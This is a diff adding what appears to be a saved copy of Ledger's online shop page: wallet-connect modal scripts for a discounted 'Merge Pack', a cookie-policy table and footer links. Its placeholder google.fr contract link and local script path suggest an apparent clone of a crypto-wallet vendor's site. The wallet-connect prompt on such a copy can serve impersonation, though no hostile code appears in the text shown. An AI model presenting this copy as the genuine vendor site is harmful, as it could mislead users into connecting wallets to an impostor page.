+    const simpleDialog = document.getElementById('simpleDialog');
+    const buttonCloseDialog = document.getElementById('simple-close-dialog');
+    const simpleDialogOutputBox = document.querySelector('output');
+    const simpleDialogHeader = document.getElementById('simple-dialog-header');
+    const simpleDialogBody = document.getElementById('simple-dialog-body');
+    const simpleDialogFooter = document.getElementById('simple-dialog-footer');
+
+    const updateSimpleModal = async (htmlData = {}) => {
+
+      
+        if (htmlData.htmlHeader) {
+            simpleDialogHeader.innerHTML = htmlData.htmlHeader
+        }
+
+        if (htmlData.htmlFooter) {
+            simpleDialogFooter.style.display = "flex"
+            simpleDialogFooter.innerHTML = htmlData.htmlFooter
+        } else {
+          simpleDialogFooter.style.display = "none"
+        }
+
+        simpleDialogBody.innerHTML = htmlData.htmlBody
+
+        $('body').addClass('stop-scrolling')
+        $('body').bind('touchmove', function(e){e.preventDefault()})
+        simpleDialog.style.display = "block"
+    }
+
+    buttonCloseDialog.addEventListener('click', (event) => {
+        closeDialogFunction()
+    })
+
+    const closeDialogFunction = () => {
+        $('body').removeClass('stop-scrolling')
+        $('body').unbind('touchmove')
+        simpleDialog.style.display = "none"
+    }
+
+    const seeWarrantyThermesAndConditions = () => {
+        updateSimpleModal({
+            htmlHeader: 'Terms of sale',
+            htmlBody: `
+                <div>
+                This information is only a summary of the benefits available under a service contract.  
+                Benefits may change or be modified during your term. 
+                 Any available benefits are governed by the terms and conditions of any issued service contract, 
+                 which govern in the event of a conflict with this summary.  
+                 Accordingly, please refer to your service contract for the most current information.  
+                 The service contract does not cover loss or damage caused directly or indirectly by any of the exclusions listed in the service contract. 
+                 <b>Please read the <a href='https://google.fr' target='_blank'>service contract</a> carefully to determine your rights, duties, and what is not covered.</b><br><br>
+                If your exact model is subject to replacement and is not available, your replacement will be of like kind and quality. 
+                This coverage may provide a duplicate of other sources of coverage. Your service contract is provided by Ledger SAS and administered by Bolttech Device Protection Services, LLC.`
+        });
+    }
+
+    const sendTrackingContentSquare = (path) => {
+      window._uxa = window._uxa || [];
+      window._uxa.push(['trackPageview', path ]);
+    }
+
+    const loadingModal = () => {
+
+        htmlBody = `
+        <div id="simple-dialog-title" class="simple-dialog-loading"><span class="loader"></span></div>
+      `
+     
+      updateSimpleModal({htmlBody})
+    }
+
+     const successModal = () => {
+        htmlBody = `<div class="simple-status-success">
+          <img class="simple-status-image" src="//cdn.shopify.com/s/files/1/2974/4858/t/278/assets/success.png?v=161523950997899106431663241030" alt="success">
+          <p id="simple-dialog-title" class="h4 simple-status-title simple-dialog-title">Success</p>
+        </div>
+      `
+     // htmlFooter = `
+      //  <p><span>Trouble connecting? </span><span><a href="">Get help here.</a></span></p>
+      // `
+      simpleDialogBody.dataset.status = true
+      updateSimpleModal({htmlBody})
+    }
+
+    const errorModal = () => {
+        sendTrackingContentSquare('?popin-tokeng-error')
+
+        htmlBody = `
+        <img class="simple-status-image" src="//cdn.shopify.com/s/files/1/2974/4858/t/278/assets/somethingWentWrong.png?v=84087111664744686591663241035" alt="something went wrong">
+        <p id="simple-dialog-title" class="h4 simple-status-title simple-dialog-title">Something went wrong</p>
+        <p id="simple-dialog-subtitle" class="simple-status-subtitle simple-dialog-subtitle">An error occurred during connection. </p>
+        <button class="button secondary simple-status-cta" onclick="connectWalletModal()">Try again</button>
+      `
+      //htmlFooter = `
+      //  <p><span>Trouble connecting? </span><span><a href="">Get help here.</a></span></p>
+      //`
+      simpleDialogBody.dataset.status = true
+      updateSimpleModal({htmlBody})
+    }
+
+    const addProductToCartModal = (item) => {
+
+        sendTrackingContentSquare('?popin-tokeng-confirm')
+
+        htmlBody = `
+        <img class="simple-status-image" src="Liquid error (sections/dialog.liquid line 116): invalid url input" alt="">
+        <p id="simple-dialog-title" class="h4 simple-status-title simple-dialog-title">You're Eligible!</p>
+        <p id="simple-dialog-subtitle" class="simple-status-subtitle simple-dialog-subtitle">You can purchase the Ledger Limited Edition Merge Pack</p>
+        <p id="simple-dialog-save" class="simple-status-subtitle-discount">Save 20%</p>
+        <button class="button secondary simple-status-cta" onclick="theme.cart.add({id: ${item.id}, product_id: ${item.product_id}}); closeDialogFunction();">Add to cart</button>`;
+
+         htmlFooter = `
+            <a onclick="connectWalletModal()">Disconnect Wallet</a>
+            `
+      simpleDialogBody.dataset.status = true
+      updateSimpleModal({htmlBody, htmlFooter})
+    }
+
+    const helpModal = () => {
+        sendTrackingContentSquare('?popin-tokeng-how')
+
+         htmlBody = `
+        <p id="simple-dialog-title" class="h4 simple-dialog-title">How it works</p>
+        <div class="simple-dialog-step">
+          <p class="simple-step-number">Step 1</p>
+          <p class="h6 simple-step-title">Connect Your Wallet</p>
+          <p class="simple-step-description">We'll verify you hold an Ethereum address</p>
+        </div>
+        <div class="simple-dialog-step">
+          <p class="simple-step-number">Step 2</p>
+          <p class="h6 simple-step-title">Add To Cart</p>
+          <p class="simple-step-description">Once verified, add the pack to your cart</p>
+        </div>
+        <div class="simple-dialog-step">
+          <p class="simple-step-number">Step 3</p>
+          <p class="h6 simple-step-title">Checkout</p>
+          <p class="simple-step-description">Complete your order like any other purchase</p>
+        </div>
+        <button class="button secondary" onclick="connectWalletModal()">Connect Wallet</button>
+      `
+      //htmlFooter = `
+      //  <p><span>Trouble connecting? </span><span><a href="">Get help here.</a></span></p>
+      //`
+        updateSimpleModal({htmlBody})
+    }
+
+    const connectWalletModal = () => {
+        sendTrackingContentSquare('?popin-tokeng-connect')
+
+        htmlBody = `
+        <p id="simple-dialog-title" class="h4 simple-dialog-title">Connect wallet</p>
+        <p class="simple-dialog-subtitle">We'll scan it for an Ethereum wallet.</p>
+        <div class="simple-connect-options">
+          ${ window.ethereum
+            ? `<button class="button primary" id="metamask-connect">Metamask</button>`
+            : ''
+          }
+          <button class="button primary" id="wallet-connect">Wallet Connect</button>
+        </div>
+        <div class="connect-disclamer"> 
+          For an improved mobile experience we recommend the use of an Ethereum enabled browser (Metamask App, Brave, etc.)
+        </div>
+      `
+      //htmlFooter = `
+      //  <p><span>Trouble connecting? </span><span><a href="">Get help here.</a></span></p>
+      //`
+      simpleDialogBody.dataset.step = 'connect'
+      simpleDialogBody.dataset.status = false
+        updateSimpleModal({htmlBody})
+    }
+</script></div>
+  
+
+
+
+<div style="display:none">
+  
+</div>
+
+<div style="display:none">
+  
+</div>
+
+
+  
+
+<main id="main">
+  <div id="shopify-section-generic-page" class="shopify-section"><div class="generic__page">
+<h1>Cookie Policy</h1>
+<h3 style="text-align: center;">Updated on July 28th, 2021.</h3>
+<h3><b></b></h3>
+<p> </p>
+<h2><b></b></h2>
+<h3><b>Cookie List</b></h3>
+<p><span style="font-weight: 400;">A cookie is a small piece of data (text file) that a website – when visited by a user – asks your browser to store on your device in order to remember information about you, such as your language preference or login information. Those cookies are set by us and called first-party cookies. We also use third-party cookies – which are cookies from a domain different than the domain of the website you are visiting – for our advertising and marketing efforts. More specifically, we use cookies and other tracking technologies for the following purposes:</span></p>
+<h3><b>Strictly Necessary Cookies</b></h3>
+<p><span style="font-weight: 400;">These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, logging in or filling in forms. You can set your browser to block or alert you about these cookies, but some parts of the site will not then work. These cookies do not store any personally identifiable information.</span></p>
+<table>
+<tbody style="border: 1px solid #d7d7d7; padding: 5px;">
+<tr style="background-color: #f6f6f4;">
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookie Subgroup</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Privacy Policy</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookies</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookies used</strong></td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Yotpo</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://www.yotpo.com/privacy-policy/" target="_blank" rel="noopener noreferrer">https://www.yotpo.com/privacy-policy/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">_sp_xxxxxxxxxx</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">First Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Hubspot</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://legal.hubspot.com/privacy-policy" target="_blank" rel="noopener noreferrer">https://legal.hubspot.com/privacy-policy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">__cfduid</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Amazon - AWS</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://aws.amazon.com/fr/privacy/" target="_blank" rel="noopener noreferrer">https://aws.amazon.com/fr/privacy/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">AWSALB, _hjIncludedInSessionSample, rCookie</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Flow.io</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://www.flow.io/policies/privacy-policy" target="_blank" rel="noopener noreferrer">https://www.flow.io/policies/privacy-policy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">__cfduid,cookies.js, _f60_session</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Ledger</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://shop.ledger.com/pages/privacy-policy">https://shop.ledger.com/pages/privacy-policy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Launch Darkly, __cfduid, __ssid, __zlcstore, _f60_session, _ga, _gat_gtag_xxxxxxxxxxxxxxxxxxxxxxxxxxx, _gat_UA-, _gclxxxx, _orig_referrer, lastRskxRun, ledger.referrer, OptanonAlertBoxClosed, OptanonConsent, rCookie, rskxRunCookie, Sentry cart, cart_currency, cart_sig, cart_ts, cart_ver, secure_customer_sig, visitorSession vt_user, AWSALB, AWSALBCORS, __cf_bm, __cfruid, _zendesk_authenticated, _zendesk_session, _zendesk_shared_session</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Shopify</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://www.shopify.com/legal/privacy" target="_blank" rel="noopener noreferrer">https://www.shopify.com/legal/privacy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">visitorSession, cookietest</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Zendesk</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://www.zendesk.com/company/agreements-and-terms/privacy-policy/" target="_blank" rel="noopener noreferrer">https://www.zendesk.com/company/agreements-and-terms/privacy-policy/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">__cfduid, __cfruid, _zendesk_session, _zendesk_authenticated, , __cfruid, __cfduid, _zendesk_shared_session, _zendesk_shared_session, _zendesk_session, _zendesk_authenticated</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Google</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://policies.google.com/privacy?hl=en" target="_blank" rel="noopener noreferrer">https://policies.google.com/privacy?hl=en</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">_GRECAPTCHA</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Fontawesome</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://fontawesome.com/privacy" target="_blank" rel="noopener noreferrer">https://fontawesome.com/privacy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">__cfduid</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">beacon.riskified.com</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">lastRskxRun, rskxRunCookie, rCookie</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+</tbody>
+</table>
+<p> </p>
+<h3><b>Performance Cookies</b></h3>
+<p><span style="font-weight: 400;">These cookies allow us to count visits and traffic sources so we can measure and improve the performance of our site. They help us to know which pages are the most and least popular and see how visitors move around the site. All information these cookies collect is aggregated and therefore anonymous. If you do not allow these cookies we will not know when you have visited our site, and will not be able to monitor its performance.</span></p>
+<table>
+<tbody style="border: 1px solid #d7d7d7; padding: 5px;">
+<tr style="background-color: #f6f6f4;">
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookie Subgroup</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Privacy Policy</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookies</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookies used</strong></td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Youtube</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://policies.google.com/privacy?hl=en" target="_blank" rel="noopener noreferrer">https://policies.google.com/privacy?hl=en</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">YSC</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Hubspot</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://legal.hubspot.com/privacy-policy" target="_blank" rel="noopener noreferrer">https://legal.hubspot.com/privacy-policy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">__cfduid</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Contentsquare</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://contentsquare.com/privacy-center/" target="_blank" rel="noopener noreferrer">https://contentsquare.com/privacy-center/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">_cs_c, _cs_id, _cs_same_site, _cs_s,_cs_same_site</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Ledger</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://shop.ledger.com/pages/privacy-policy" target="_blank" rel="noopener noreferrer">https://shop.ledger.com/pages/privacy-policy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">_gaexp, _gid, _gaexp_rc, __hssc, __hssrc, __hstc, _cs_c, _cs_id, _cs_root-domain, _cs_s, _gat, _hjAbsoluteSessionInProgress, _hjFirstSeen, _hjid, _hjTLDTest, _landing_page, _s, _schn, _shopify_d, _shopify_fs, _shopify_s, _shopify_sa_p, _shopify_sa_t, _shopify_y, _y, ajs_group_id, hubspotutk, ledger.affiliate_tracker, ledger.affiliate_uuid, zte2095, _hjIncludedInPageviewSample, _hjIncludedInSessionSample</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Yotpo</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://www.yotpo.com/privacy-policy/" target="_blank" rel="noopener noreferrer">https://www.yotpo.com/privacy-policy/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">pixel</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Drift</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://www.drift.com/privacy-policy/" target="_blank" rel="noopener noreferrer">https://www.drift.com/privacy-policy/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">driftt_aid, drift_aid, drift_campaign_refresh</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Hotjar</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://www.hotjar.com/legal/policies/privacy/" target="_blank" rel="noopener noreferrer">https://www.hotjar.com/legal/policies/privacy/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">_hjIncludedInPageviewSample, _hjIncludedInSessionSample</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Linkedin</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://fr.linkedin.com/legal/privacy-policy" target="_blank" rel="noopener noreferrer">https://fr.linkedin.com/legal/privacy-policy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">AnalyticsSyncHistory</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Snapchat</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://snap.com/en-US/privacy/privacy-policy" target="_blank" rel="noopener noreferrer">https://snap.com/en-US/privacy/privacy-policy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">sc_at</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+</tbody>
+</table>
+<p> </p>
+<h3><b>Functional Cookies</b></h3>
+<p><span style="font-weight: 400;">These cookies enable the website to provide enhanced functionality and personalisation. They may be set by us or by third party providers whose services we have added to our pages. If you do not allow these cookies then some or all of these services may not function properly.</span></p>
+<table>
+<tbody style="border: 1px solid #d7d7d7; padding: 5px;">
+<tr style="background-color: #f6f6f4;">
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookie Subgroup</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Privacy Policy</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookies</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookies used</strong></td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">ledger.com</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://shop.ledger.com/pages/privacy-policy">https://shop.ledger.com/pages/privacy-policy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">__tld__, __zlcmid, ajs%3Acookies, ajs%3Atest, ajs_anonymous_id, _sp_xxxxxxxxxx, cookies.js, cookietest, _help_center_session</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">First Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Bootstrap CDN</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://www.jsdelivr.com/terms/privacy-policy-jsdelivr-net" target="_blank" rel="noopener noreferrer">https://www.jsdelivr.com/terms/privacy-policy-jsdelivr-net</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">__cfduid</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">First Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Amazon - AWS</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://aws.amazon.com/fr/privacy/" target="_blank" rel="noopener noreferrer">https://aws.amazon.com/fr/privacy/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">AWSALBCORS</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Youtube</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://policies.google.com/privacy?hl=en" target="_blank" rel="noopener noreferrer">https://policies.google.com/privacy?hl=en</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">CONSENT</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Google</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://policies.google.com/privacy?hl=en" target="_blank" rel="noopener noreferrer">https://policies.google.com/privacy?hl=en</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">DRIVE_STREAM</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Mathjax</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://docs.mathjax.org/en/latest/misc/faq.html">https://docs.mathjax.org/en/latest/misc/faq.html</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">__cfduid</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Github</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://docs.github.com/en/github/site-policy/github-privacy-statement" target="_blank" rel="noopener noreferrer">https://docs.github.com/en/github/site-policy/github-privacy-statement</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">_octo, logged_in</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Zendesk</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://www.zendesk.com/company/agreements-and-terms/privacy-policy/" target="_blank" rel="noopener noreferrer">https://www.zendesk.com/company/agreements-and-terms/privacy-policy/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">_zendesk_thirdparty_test, __zlcid</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+</tbody>
+</table>
+<p> </p>
+<h3><b>Targeting Cookies</b></h3>
+<p><span style="font-weight: 400;">These cookies may be set through our site by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant adverts on other sites. They do not store directly personal information, but are based on uniquely identifying your browser and internet device. If you do not allow these cookies, you will experience less targeted advertising.</span></p>
+<table>
+<tbody style="border: 1px solid #d7d7d7; padding: 5px;">
+<tr style="background-color: #f6f6f4;">
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookie Subgroup</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Privacy Policy</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookies</strong></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><strong>Cookies used</strong></td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">ledger.com</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://shop.ledger.com/pages/privacy-policy">https://shop.ledger.com/pages/privacy-policy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">_fbp, _scid, ajs_user_id, awxxxx, pt_</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">First Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Contentsquare</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://contentsquare.com/privacy-center/" target="_blank" rel="noopener noreferrer">https://contentsquare.com/privacy-center/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">_cs_nnnnnnnnnnnnn</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">First Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Youtube</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://policies.google.com/privacy?hl=en" target="_blank" rel="noopener noreferrer">https://policies.google.com/privacy?hl=en</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">VISITOR_INFO1_LIVE</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Twitter</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://twitter.com/en/privacy" target="_blank" rel="noopener noreferrer">https://twitter.com/en/privacy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">personalization_id</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Drift</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://www.drift.com/privacy-policy/" target="_blank" rel="noopener noreferrer">https://www.drift.com/privacy-policy/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">drift_aid, drift_campaign_refresh, driftt_aid</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Doubleclick (Google)</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://policies.google.com/privacy?hl=en" target="_blank" rel="noopener noreferrer">https://policies.google.com/privacy?hl=en</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">test_cookie</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Linkedin</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://fr.linkedin.com/legal/privacy-policy" target="_blank" rel="noopener noreferrer">https://fr.linkedin.com/legal/privacy-policy</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">bcookie, lang, lidc, UserMatchHistory</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Medium</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9" target="_blank" rel="noopener noreferrer">https://policy.medium.com/medium-privacy-policy-f03bf92035c9</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">__cfduid</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Facebook</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://www.facebook.com/about/privacy/" target="_blank" rel="noopener noreferrer">https://www.facebook.com/about/privacy/</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">fr</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+<tr>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Google</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;"><a href="https://policies.google.com/privacy?hl=en" target="_blank" rel="noopener noreferrer">https://policies.google.com/privacy?hl=en</a></td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">NID</td>
+<td style="border: 1px solid #d7d7d7; padding: 5px;">Third Party</td>
+</tr>
+</tbody>
+</table>
+<p> </p>
+<p>You can withdraw your consent at any time here: <!-- OneTrust Cookies Settings button start --> <button id="ot-sdk-btn" class="ot-sdk-show-settings">Cookie Settings</button> <!-- OneTrust Cookies Settings button end --></p>
+</div>
+
+
+</div>
+
+  
+  <!--Back in stock Js-->
+  <script src="js/global-back-in-stock.js" type="text/javascript"></script>
+</main>
+
+
+
+
+  
+
+  <div id="shopify-section-footer" class="shopify-section">
+ 
+
+
+
+
+
+
+  <div class="bg bg-secondary prefooter-blocks">
+    <div class="row">
+      <div class="row flexbox">
+        <div>
+          <h3 class="h5 margin-xxs">Stay in touch</h3>
+          <p>Announcements can be found in our blog. Press contact:<br class="is-hidden-mobile"> <a href="mailto:media@ledger.com" title="">media@ledger.com</a></p>
+
+          <ul class="no-bullet social-icons">
+                  <li><a href="https://github.com/LedgerHQ" title="Ledger Github" target="_blank"><i class="fab fa-github"></i></a></li>
+                
+              
+            
+                  <li><a href="https://www.facebook.com/Ledger/" title="Ledger Facebook" target="_blank"><i class="fab fa-facebook"></i></a></li>
+                
+              
+            
+                  <li><a href="https://www.instagram.com/ledger/" title="Ledger Instagram" target="_blank"><i class="fab fa-instagram"></i></a></li>
+                
+              
+            
+                  <li><a href="https://twitter.com/Ledger" title="Ledger Twitter" target="_blank"><i class="fab fa-twitter"></i></a></li>
+                
+              
+            
+                  <li><a href="https://www.youtube.com/Ledger" title="Youtube" target="_blank"><i class="fab fa-youtube"></i></a></li>
+                
+              
+            
+                  <li><a href="https://www.linkedin.com/company/ledgerhq" title="Ledger Linkedin" target="_blank"><i class="fab fa-linkedin"></i></a></li>
+                
+              
+            
+                  <li><a href="https://www.tiktok.com/@ledger" title="TikTok" target="_blank"><i class="fab fa-tiktok"></i></a></li>
+                
+              
+            
+            <!--<li><a href="#" title="Ledger Reddit"><i class="fab fa-reddit"></i></a></li>
+            <li><a href="#" title="Ledger Facebook"><i class="fab fa-facebook"></i></a></li>
+            <li><a href="#" title="Ledger Twitter"><i class="fab fa-twitter"></i></a></li>
+            <li><a href="#" title="Ledger Youtube"><i class="fab fa-youtube"></i></a></li>
